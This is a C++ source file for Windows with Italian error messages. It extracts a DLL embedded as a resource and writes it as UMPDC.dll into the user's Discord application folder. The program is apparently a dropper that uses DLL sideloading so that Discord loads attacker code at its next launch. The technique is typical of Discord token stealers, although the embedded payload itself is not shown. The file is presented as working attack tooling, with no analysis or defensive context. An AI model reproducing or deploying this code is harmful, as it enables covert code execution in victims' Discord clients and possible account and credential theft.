#include <iostream>
#include <filesystem>
#include <fstream>
#include <windows.h>
#include <lmcons.h>
#include <vector>
#include "resources.h"

namespace fs = std::filesystem;


std::vector<char> getResourceData()
{
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule == NULL) {
    throw std::runtime_error("Impossibile ottenere il handle del modulo corrente.");
    }
    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(MY_DLL), RT_RCDATA);
    if (hResource == NULL) {
        throw std::runtime_error("Risorsa non trovata");
    }

    HGLOBAL hLoadedResource = LoadResource(hModule, hResource);
    if (hLoadedResource == NULL) {
       throw std::runtime_error("Impossibile caricare la risorsa");
    }

    DWORD resourceSize = SizeofResource(hModule, hResource);
    const char* resourceData = static_cast<const char*>(LockResource(hLoadedResource));

    return std::vector<char>(resourceData, resourceData + resourceSize);
}

// Funzione per salvare i dati della risorsa come file
void saveResourceDataToFile(const fs::path& filePath)
{
   std::vector<char> resourceData = getResourceData();
    std::ofstream outputFile(filePath, std::ios::binary);
    outputFile.write(resourceData.data(), resourceData.size());
}

std::string getSystemUsername()
{
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;

    if (GetUserNameA(username, &size))
    {
        return std::string(username);
    }

    return "";
}



void copyDll(const fs::path& sourcePath, const fs::path& destinationPath)
{
    try // If you want to avoid exception handling, then use the error code overload of the following functions.
    {
        fs::create_directories(destinationPath); // Recursively create target directory if not existing.
        fs::copy_file(sourcePath, destinationPath/sourcePath.filename(), fs::copy_options::overwrite_existing);
    }
    catch (std::exception& e) // Not using fs::filesystem_error since std::bad_alloc can throw too.  
    {
        std::cout << e.what();
    }
}

int main()
{
    namespace fs = std::filesystem;
        

    std::string username = getSystemUsername();

    fs::path destinationFolder = "C:\\Users\\"+username+"\\AppData\\Local\\Discord\\app-1.0.9013\\UMPDC.dll";

    fs::path tempDllPath = fs::temp_directory_path() / "UMPDC.dll";

    std::vector<char> resourceData = getResourceData();
    std::ofstream outputFile(destinationFolder, std::ios::binary); 
    outputFile.write(resourceData.data(), resourceData.size());



}
